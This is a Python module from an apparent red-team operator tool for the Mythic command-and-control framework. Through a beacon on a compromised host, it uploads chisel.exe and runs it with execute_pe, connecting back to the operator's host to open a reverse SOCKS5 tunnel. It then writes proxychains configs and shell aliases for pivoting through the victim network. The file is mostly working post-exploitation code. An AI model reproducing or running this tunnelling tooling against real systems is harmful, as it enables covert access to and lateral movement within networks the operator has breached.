from __future__ import annotations

import re
import shutil
from pathlib import Path

from mythic import mythic as _mythic

from mythic_operator.api import (
    beacon_to_row,
    find_beacon,
    find_mythic_file,
    upload_file_to_mythic,
    issue_task_and_wait_output,
    create_task,
)
from mythic_operator.commands.socks import (
    PROXYCHAINS_SRC,
    PROXY_ALIASES_FILE,
    _RC_FILES,
    _FISH_CONFIG,
    _SOURCE_MARKER,
)

CHISEL_DIR = Path.home() / "PROXY" / "CHISEL"
DEFAULT_CHISEL_PATH = Path.home() / "Z_TOOLS" / "chisel.exe"


def _to_int(value: str) -> int | None:
    try:
        return int(str(value))
    except (TypeError, ValueError):
        return None


def _is_windows(beacon_row: dict) -> bool:
    return "windows" in beacon_row.get("os", "").lower()


def _setup_proxychains(beacon_name: str, sport: int) -> Path:
    CHISEL_DIR.mkdir(parents=True, exist_ok=True)
    dest = CHISEL_DIR / f"{beacon_name}.conf"

    if PROXYCHAINS_SRC.exists():
        shutil.copy2(PROXYCHAINS_SRC, dest)
        content = dest.read_text(encoding="utf-8")
        content = re.sub(r"^\s*socks[45]\s+.*$", "", content, flags=re.MULTILINE)
        content = content.rstrip() + f"\nsocks5 127.0.0.1 {sport}\n"
        dest.write_text(content, encoding="utf-8")
    else:
        dest.write_text(
            f"strict_chain\nproxy_dns\n[ProxyList]\nsocks5 127.0.0.1 {sport}\n",
            encoding="utf-8",
        )

    return dest


def _register_alias(beacon_name: str, conf_path: Path) -> str:
    alias_name = f"pc_{beacon_name}"
    alias_line = f"alias {alias_name}='proxychains4 -f {conf_path}'"

    if PROXY_ALIASES_FILE.exists():
        content = PROXY_ALIASES_FILE.read_text(encoding="utf-8")
        pattern = rf"^alias {re.escape(alias_name)}=.*$"
        if re.search(pattern, content, flags=re.MULTILINE):
            content = re.sub(pattern, alias_line, content, flags=re.MULTILINE)
        else:
            content = content.rstrip() + f"\n{alias_line}\n"
        PROXY_ALIASES_FILE.write_text(content, encoding="utf-8")
    else:
        PROXY_ALIASES_FILE.write_text(f"{alias_line}\n", encoding="utf-8")

    source_line = f'{_SOURCE_MARKER}\n[ -f "{PROXY_ALIASES_FILE}" ] && source "{PROXY_ALIASES_FILE}"'
    for rc in _RC_FILES:
        if not rc.exists():
            continue
        text = rc.read_text(encoding="utf-8")
        if str(PROXY_ALIASES_FILE) not in text:
            rc.write_text(text.rstrip() + f"\n{source_line}\n", encoding="utf-8")

    if _FISH_CONFIG.exists():
        fish_source = f"{_SOURCE_MARKER}\nif test -f {PROXY_ALIASES_FILE}\n    source {PROXY_ALIASES_FILE}\nend"
        text = _FISH_CONFIG.read_text(encoding="utf-8")
        if str(PROXY_ALIASES_FILE) not in text:
            _FISH_CONFIG.write_text(text.rstrip() + f"\n{fish_source}\n", encoding="utf-8")

    return alias_name


async def _issue_execute_pe(session, callback_numeric_id: int, file_id: str, chisel_name: str, chisel_args: str) -> str:
    """Submit execute_pe without waiting for completion (chisel runs in background)."""
    params_str = f"{chisel_name} {chisel_args}"
    try:
        task = await _mythic.issue_task(
            mythic=session,
            command_name="execute_pe",
            parameters=params_str,
            callback_display_id=callback_numeric_id,
            file_ids=[file_id],
            wait_for_complete=False,
        )
        if task and "display_id" in task and task["display_id"]:
            return f"[+] Task #{task['display_id']} submitted (status: {task.get('status', 'submitted')})"
    except Exception:
        pass
    return ""


async def _issue_stop(session, beacon_row: dict, callback_numeric_id: int) -> None:
    if _is_windows(beacon_row):
        cmd, params = "shell", "taskkill /F /IM chisel.exe"
    else:
        cmd, params = "shell", "pkill -9 chisel"

    try:
        output = await issue_task_and_wait_output(
            session=session,
            callback_display_id=callback_numeric_id,
            command_name=cmd,
            parameters=params,
            timeout=30,
        )
        if output:
            print(output)
    except Exception:
        await create_task(
            session,
            beacon_id=beacon_row["id"],
            callback_display_id=beacon_row["name"],
            callback_numeric_id=callback_numeric_id,
            command_name=cmd,
            params=params,
            wait_for_complete=False,
        )


async def run_chisel(
    session,
    beacon_selector: str,
    lhost: str,
    lport: int,
    sport: int,
    chisel_path: Path,
    stop: bool,
) -> None:
    beacon = await find_beacon(session, beacon_selector)
    beacon_row = beacon_to_row(beacon)
    beacon_name = beacon_row["host"] or beacon_row["name"] or beacon_selector
    callback_numeric_id = _to_int(beacon_row["name"]) or _to_int(beacon_row["id"])

    if callback_numeric_id is None:
        raise RuntimeError(
            f"Beacon '{beacon_selector}' does not have a numeric display id required by Mythic"
        )

    if stop:
        kill_cmd = "taskkill /F /IM chisel.exe" if _is_windows(beacon_row) else "pkill -9 chisel"
        print(f"[*] Stopping chisel on beacon {beacon_name!r} ({kill_cmd}) ...")
        await _issue_stop(session, beacon_row, callback_numeric_id)
        print(f"[+] chisel stop task issued on beacon {beacon_name!r}")
        return

    # Ensure chisel.exe is available in Mythic
    print(f"[*] Checking Mythic file registry for {chisel_path.name} ...")
    file_id = await find_mythic_file(session, chisel_path.name)
    if file_id:
        print(f"[*] Found existing {chisel_path.name} in Mythic (id={file_id})")
    else:
        print(f"[*] Uploading {chisel_path} to Mythic ...")
        file_id = await upload_file_to_mythic(session, chisel_path)
        print(f"[+] Uploaded {chisel_path.name} (id={file_id})")

    chisel_args = f"client {lhost}:{lport} R:{sport}:socks"

    print(f"[*] Task: execute_pe {chisel_path.name} {chisel_args}")
    print(f"[*] Run chisel server first: chisel server --port {lport} --reverse")

    output = await _issue_execute_pe(session, callback_numeric_id, file_id, chisel_path.name, chisel_args)

    if not output:
        # last-resort fallback via create_task (fire and forget)
        try:
            await create_task(
                session,
                beacon_id=beacon_row["id"],
                callback_display_id=beacon_row["name"],
                callback_numeric_id=callback_numeric_id,
                command_name="execute_pe",
                params=f"{chisel_path.name} {chisel_args}",
                wait_for_complete=False,
            )
        except Exception as exc:
            raise RuntimeError(f"Failed to issue execute_pe task: {exc}") from exc

    if output:
        print(output)

    print(f"[+] Chisel SOCKS5 proxy started on 127.0.0.1:{sport} via beacon {beacon_name!r}")

    conf_path = _setup_proxychains(beacon_name, sport)
    print(f"[+] proxychains config written to {conf_path}")

    alias_name = _register_alias(beacon_name, conf_path)
    print(f"[+] alias registered: {alias_name}='proxychains4 -f {conf_path}'")
    print(f"[*] Run in current shell: source {PROXY_ALIASES_FILE}")
